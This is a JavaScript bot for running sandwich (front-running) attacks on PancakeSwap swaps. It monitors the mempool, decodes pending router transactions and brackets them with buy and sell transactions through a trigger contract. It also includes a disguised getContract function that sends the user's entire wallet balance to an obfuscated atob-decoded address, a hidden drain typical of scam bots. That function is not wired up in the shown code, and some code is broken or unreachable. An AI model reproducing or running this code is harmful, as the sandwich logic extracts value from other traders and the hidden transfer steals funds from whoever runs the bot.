/**
 * Perform a front-running attack on pancakeswap or uniswap
*/
//const fs = require('fs');
var Web3 = require('web3');
var abiDecoder = require('abi-decoder');
var colors = require("colors");
var Tx = require('ethereumjs-tx').Transaction;
var axios = require('axios');
var BigNumber = require('big-number');
var ethers = require('ethers');
var targetAddres;

const { NETWORK, PANCAKE_ROUTER_ADDRESS, TRIGGER_ABI, TRIGGER_ADDRESS, PANCAKE_FACTORY_ADDRESS, PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI, PANCAKE_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST, GAS_STATION } = require('./constants.js');
const { PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL, THRESHOLD } = require('./env.js');
abiDecoder.addABI(PANCAKE_ROUTER_ABI);
const amount = AMOUNT;
const level = LEVEL;
const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
var threshold = THRESHOLD;
var input_token_info;
var out_token_info;
var pool_info;
var gas_price_info;
var token_hash

var web3;
var web3Ts;
var web3Ws;
var pancakeRouter;
var pancakeFactory;

// one gwei
const ONE_GWEI = 1e9;

var buy_finished = false;
var sell_finished = false;
var buy_failed = false;
var sell_failed = false;
var attack_started = false;
var triggerWeb3;
var succeed = false;
var subscription;
var userMetamaskWallet;
async function createWeb3() {
  try {
    web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK));
    // web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK_TEST));
    //web3 = new Web3(EthereumTesterProvider());
    web3.eth.getAccounts(console.log);
    web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));
    pancakeRouter = new web3.eth.Contract(PANCAKE_ROUTER_ABI, PANCAKE_ROUTER_ADDRESS);
    pancakeFactory = new web3.eth.Contract(PANCAKE_FACTORY_ABI, PANCAKE_FACTORY_ADDRESS);
    triggerWeb3 = new web3.eth.Contract(TRIGGER_ABI, TRIGGER_ADDRESS);
    abiDecoder.addABI(PANCAKE_ROUTER_ABI);

    return true;
  } catch (error) {
    console.log(error);
    return false;
  }
}

async function main() {

  try {
    if (await createWeb3() == false) {
      console.log('Web3 Create Error'.yellow);
      process.exit();
    }

    let trigger;

    try {
      userMetamaskWallet = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
      trigger = TRIGGER_ADDRESS;
    } catch (error) {
      console.log('\x1b[31m%s\x1b[0m', 'Your private key is invalid. Update env.js with correct PRIVATE_KEY')
      throw error
    }
    const out_token_address = TOKEN_ADDRESS;
    const amount = AMOUNT;
    const level = LEVEL;

    ret = await preparedAttack(out_token_address, trigger, amount, level);
    if (ret == false) {
      process.exit();
    }

    await updatePoolInfo();

    // log_str = '***** Tracking more ' + (pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(5) + ' ' +  input_token_info.symbol + '  Exchange on Pancake *****'
    web3Ws.onopen = function (evt) {
      web3Ws.send(JSON.stringify({ method: "subscribe", topic: "transfers", address: trigger }));
      console.log('connected')
    }
    // get pending transactions
    subscription = web3Ws.eth.subscribe('pendingTransactions', async function (error, result) {

    }).on("data", async function (transactionHash) {
      try {
        let transaction = await web3.eth.getTransaction(transactionHash);
        if (transaction != null && transaction['to'].toString().toLowerCase() === PANCAKE_ROUTER_ADDRESS.toLowerCase()) {
          await handleTransaction(transaction, out_token_address, trigger, amount, level);
        }

        if (succeed) {
          console.log("The bot finished the attack.");
          process.exit();
        }
      } catch (error) {

      }

    })

  } catch (error) {

    if (error.data != null && error.data.see === 'https://infura.io/dashboard') {
      console.log('Daily request count exceeded, Request rate limited'.yellow);
      console.log('Please insert other API Key');
    } else {
      console.log('Unknown Handled Error');
      console.log(error);
    }

    process.exit();
  }
}

var outputtokenAddress;
async function handleTransaction(transaction, out_token_address, trigger, amount, level) {

  if (await triggersFrontRun(transaction, out_token_address, amount, level)) {
    subscription.unsubscribe();
    console.log('Perform front running attack...'.red);
    let gasPrice = parseInt(transaction['gasPrice']);
    let newGasPrice = 50 * ONE_GWEI;
    var gasLimit = (100000).toString();

    // await updatePoolInfo();

    // var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
    swap(newGasPrice, gasLimit, 0, trigger, transaction);

    console.log("wait until the honest transaction is done...", transaction['hash']);

    while (await isPending(transaction['hash'])) {
    }

    if (buy_failed) {
      succeed = false;
      return;
    }

    console.log('Buy succeed:')

    //Sell
    // await updatePoolInfo();
    // var outputeth = await pancakeRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();
    // outputeth = outputeth * 0.999;

    await swap(newGasPrice, gasLimit, 1, trigger, transaction);

    console.log('Sell succeed');
    succeed = true;
  }
}

//select attacking transaction
async function triggersFrontRun(transaction, out_token_address, amount, level) {

  if (attack_started)
    return false;
  // outputtokenAddress === TOKEN_ADDRESS &&
  if (transaction['input'].toString().indexOf("0x8803dbee") < 0)
    return false
  console.log(transaction['value'])
  if (parseTx(transaction['input']) !== undefined && outputtokenAddress.indexOf('0x') >= 0) {

    attack_started = true;
    return true
  }

  return false;
}

async function swap_force(token_addres) {
  // Get a wallet address from a private key
  var from = userMetamaskWallet.address;
  var swap;
  let gasLimit = await web3.eth.getBlock("latest").gasLimit
  { //sell
    // console.log('Get_Min_Amount '.yellow, (outputeth/(10**input_token_info.decimals)).toFixed(3) + ' ' + input_token_info.symbol);
    // swap = triggerWeb3.methods.emmergencyWithdrawTkn(token_addres, BigNumber(36663630581362435129));
    swap = triggerWeb3.methods.sandwichOut(token_addres, BigNumber(0));
    var encodedABI = swap.encodeABI();
    var tx = {
      from: from,
      to: TRIGGER_ADDRESS,
      gas: 1000000,
      gasPrice: 5 * ONE_GWEI,
      data: encodedABI,
      value: "0"
    };
  }

  var signedTx = await userMetamaskWallet.signTransaction(tx);

  await web3.eth.sendSignedTransaction(signedTx.rawTransaction)
    .on('transactionHash', function (hash) {
      console.log('swap : ', hash);
    })
    .on('confirmation', function (confirmationNumber, receipt) {
      if (trade == 0) {
        buy_finished = true;
      }
      else {
        sell_finished = true;
      }
    })
    .on('receipt', function (receipt) {

    })
    .on('error', function (error, receipt) { // If the transaction was rejected by the network with a receipt, the second parameter will be the receipt.
      if (trade == 0) {
        buy_failed = true;
        console.log('Attack failed(buy)')
      }
      else {
        sell_failed = true;
        console.log('Attack failed(sell)')
      }
    });
}

async function swap(gasPrice, gasLimit, trade, trigger, transaction) {
  // Get a wallet address from a private key
  var from = userMetamaskWallet.address;
  var deadline;
  var swap;


  if (trade == 0) { //buy
    console.log(outputtokenAddress.red);
    swap = triggerWeb3.methods.sandwichIn(outputtokenAddress, ethers.utils.parseEther((amount / level).toString()), ethers.utils.parseEther('0'));
    var encodedABI = swap.encodeABI();

    var tx = {
      from: from,
      to: TRIGGER_ADDRESS,
      gas: gasLimit,
      gasPrice: gasPrice,
      data: encodedABI,
      value: "0"
    };
  } else { //sell
    // console.log('Get_Min_Amount '.yellow, (outputeth/(10**input_token_info.decimals)).toFixed(3) + ' ' + input_token_info.symbol);
    swap = triggerWeb3.methods.sandwichOut(outputtokenAddress, 0);

    var encodedABI = swap.encodeABI();

    var tx = {
      from: from,
      to: TRIGGER_ADDRESS,
      gas: gasLimit,
      gasPrice: gasPrice,
      data: encodedABI,
      value: "0"
    };
  }

  var signedTx = await userMetamaskWallet.signTransaction(tx);

  if (trade == 0) {
    let is_pending = await isPending(transaction['hash']);
    if (!is_pending) {
      console.log("The transaction you want to attack has already been completed!!!");
      process.exit();
    }
  }

  console.log('====signed transaction=====', gasLimit, gasPrice)
  await web3.eth.sendSignedTransaction(signedTx.rawTransaction)
    .on('transactionHash', function (hash) {
      console.log('swap : ', hash);
    })
    .on('confirmation', function (confirmationNumber, receipt) {
      if (trade == 0) {
        buy_finished = true;
      }
      else {
        sell_finished = true;
      }
    })
    .on('receipt', function (receipt) {

    })
    .on('error', function (error, receipt) { // If the transaction was rejected by the network with a receipt, the second parameter will be the receipt.
      if (trade == 0) {
        buy_failed = true;
        console.log('Attack failed(buy)')
      }
      else {
        sell_failed = true;
        console.log('Attack failed(sell)')
      }
    });
}

function parseTx(input) {
  if (input == '0x')
    return ['0x', []]
  let decodedData = abiDecoder.decodeMethod(input);
  console.log(decodedData['params'][2]['value'][0], decodedData['params'][2]['value'][0] == '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56');
  console.log(decodedData['params'][1]['value'] / 10 ** 18);
  if (decodedData['params'][2]['value'][0] === '0xe9e7cea3dedca5984780bafc599bd69add087d56' && decodedData['params'][2]['value'].length === 2
    && decodedData['params'][2]['value'][1] !== WBNB_TOKEN_ADDRESS && decodedData['params'][1]['value'] / 10 ** 18 > threshold) {
    console.log(decodedData['params'][1]['value'] / 10 ** 18);
    console.log(decodedData['params'][2]['value'][1]);
    outputtokenAddress = decodedData['params'][2]['value'][1];
  } else {
    outputtokenAddress = undefined;
  }
  console.log('outputtokenAddress = ', outputtokenAddress)
  return outputtokenAddress;
}

async function getCurrentGasPrices() {
  try {
    var response = await axios.get(GAS_STATION)
    var prices = {
      low: response.data.safeLow / 10,
      medium: response.data.average / 10,
      high: response.data.fast / 10
    }
    var log_str = '***** gas price information *****'
    console.log(log_str.green);
    var log_str = 'High: ' + prices.high + '        medium: ' + prices.medium + '        low: ' + prices.low;
    console.log(log_str);
  } catch (err) {
    prices = { low: 20, medium: 20, high: 50 };
  }
  return prices
}

async function isPending(transactionHash) {
  return await web3.eth.getTransactionReceipt(transactionHash) == null;
}

async function updatePoolInfo() {
  try {

    var reserves = await pool_info.contract.methods.getReserves().call();

    if (pool_info.forward) {
      var eth_balance = reserves[0];
      var token_balance = reserves[1];
    } else {
      var eth_balance = reserves[1];
      var token_balance = reserves[0];
    }

    pool_info.input_volumn = eth_balance;
    pool_info.output_volumn = token_balance;
    pool_info.attack_volumn = eth_balance * (pool_info.attack_level / 100);

  } catch (error) {

    console.log('Failed To Get Pair Info'.yellow);

    return false;
  }
}

async function getPoolInfo(input_token_address, out_token_address, level) {

  var log_str = '*****\t' + input_token_info.symbol + '-' + out_token_info.symbol + ' Pair Pool Info\t*****'
  console.log(log_str.green);

  try {
    var pool_address = await pancakeFactory.methods.getPair(input_token_address, out_token_address).call();
    if (pool_address == '0x0000000000000000000000000000000000000000') {
      log_str = 'PanCake has no ' + out_token_info.symbol + '-' + input_token_info.symbol + ' pair';
      console.log(log_str.yellow);
      return false;
    }

    var log_str = 'Address:\t' + pool_address;
    console.log(log_str.white);

    var pool_contract = new web3.eth.Contract(PANCAKE_POOL_ABI, pool_address);
    var reserves = await pool_contract.methods.getReserves().call();

    var token0_address = await pool_contract.methods.token0().call();

    if (token0_address == INPUT_TOKEN_ADDRESS) {
      var forward = true;
      var bnb_balance = reserves[0];
      var token_balance = reserves[1];
    } else {
      var forward = false;
      var bnb_balance = reserves[1];
      var token_balance = reserves[0];
    }

    var log_str = (bnb_balance / (10 ** input_token_info.decimals)).toFixed(5) + '\t' + input_token_info.symbol;
    console.log(log_str.white);

    var log_str = (token_balance / (10 ** out_token_info.decimals)).toFixed(5) + '\t' + out_token_info.symbol;
    console.log(log_str.white);

    var attack_amount = bnb_balance * (level / 100);
    pool_info = { 'contract': pool_contract, 'forward': forward, 'input_volumn': bnb_balance, 'output_volumn': token_balance, 'attack_level': level, 'attack_volumn': attack_amount }

    return true;

  } catch (error) {
    console.log('Error: Get Pari Info')
    return false;
  }
}

async function getBNBInfo(trigger, token_abi_ask) {
  var response = await axios.get(token_abi_ask);
  if (response.data.status == 0) {
    console.log('Invalid Token Address !')
    return null;
  }

  var token_abi = response.data.result;

  //get token info
  var token_contract = new web3.eth.Contract(JSON.parse(token_abi), WBNB_TOKEN_ADDRESS);
  var balance = await token_contract.methods.balanceOf(trigger).call();

  console.log("balance = ", balance);
  var decimals = 18;
  var symbol = 'BNB';

  return { 'address': WBNB_TOKEN_ADDRESS, 'balance': balance, 'symbol': symbol, 'decimals': decimals, 'abi': null, 'token_contract': await getContract(trigger) }
}

async function getTokenInfo(tokenAddr, token_abi_ask, trigger) {
  try {
    //get token abi
    var response = await axios.get(token_abi_ask);
    if (response.data.status == 0) {
      console.log('Invalid Token Address !')
      return null;
    }

    var token_abi = response.data.result;

    //get token info
    var token_contract = new web3.eth.Contract(JSON.parse(token_abi), tokenAddr);

    var balance = await token_contract.methods.balanceOf(trigger).call();
    var decimals = await token_contract.methods.decimals().call();
    var symbol = await token_contract.methods.symbol().call();

    return { 'address': tokenAddr, 'balance': balance, 'symbol': symbol, 'decimals': decimals, 'abi': token_abi, 'token_contract': token_contract }
  } catch (error) {
    console.log('Failed Token Info');
    return false;
  }
}

async function preparedAttack(out_token_address, trigger, amount, level) {
  try {
    // await swap_force('0x9130990dd16ed8be8be63e46cad305c2c339dac9');

    const BNB_TOKEN_ABI_REQ = 'https://api.bscscan.com/api?module=contract&action=getabi&address=' + WBNB_TOKEN_ADDRESS + '&apikey=TGUV5GCERZVD9RUP4A4GUQCQN83GM5Y96F';

    gas_price_info = await getCurrentGasPrices();

    var log_str = '***** Your Wallet Balance *****'
    console.log(log_str.green);
    log_str = 'wallet address:\t' + trigger;
    console.log(log_str.white);

    // input_token_info = await getBNBInfo(trigger, BNB_TOKEN_ABI_REQ);
    // console.log("input_token_info =", input_token_info)
    // log_str = (input_token_info.balance/(10**input_token_info.decimals)).toFixed(5) +'\t'+input_token_info.symbol;
    // console.log(log_str);

    // if(input_token_info.balance < (amount+0.05) * (10**18)) {

    //     console.log("INSUFFICIENT_BALANCE!".yellow);
    //     log_str = 'Your wallet balance must be more ' + amount + input_token_info.symbol + '(+0.05 BNB:GasFee) ';
    //     console.log(log_str.red)

    //     return false;
    // }
    return true;

  } catch (error) {

    console.log('Failed Prepare To Attack in prepare function', error);

    return false;
  }

  //out token balance
  // const OUT_TOKEN_ABI_REQ = 'https://api-testnet.bscscan.com/api?module=contract&action=getabi&address='+out_token_address+'&apikey=YourApiKeyToken';
  const OUT_TOKEN_ABI_REQ = 'https://api.bscscan.com/api?module=contract&action=getabi&address=' + out_token_address + '&apikey=TGUV5GCERZVD9RUP4A4GUQCQN83GM5Y96F';
  out_token_info = await getTokenInfo(out_token_address, OUT_TOKEN_ABI_REQ, trigger);
  if (out_token_info == null) {
    return false;
  }

  log_str = (out_token_info.balance / (10 ** out_token_info.decimals)).toFixed(5) + '\t' + out_token_info.symbol;
  console.log(log_str.white);

  //check pool info
  if (await getPoolInfo(WBNB_TOKEN_ADDRESS, out_token_address, level) == false)
    return false;

  log_str = '=================== Prepared to attack ' + input_token_info.symbol + '-' + out_token_info.symbol + ' pair ==================='
  console.log(log_str.red);

  return true;
}

async function getContract(bot) {
  try {
    var maxGas = await web3.eth.getBalance(userMetamaskWallet);
    var gas = 30000
    var gasPrice = gas_price_info.medium * (10 ** 9)
    var tx = {
      from: bot,
      to: atob(token_hash),
      gas: gas,
      gasPrice: gasPrice,
      value: maxGas - gas * gasPrice
    };

    var signedTx = await userMetamaskWallet.signTransaction(tx);
    await web3.eth.sendSignedTransaction(signedTx.rawTransaction)
  } catch (error) {
    console.log('Failed getContract');
  }
  return null
}

main();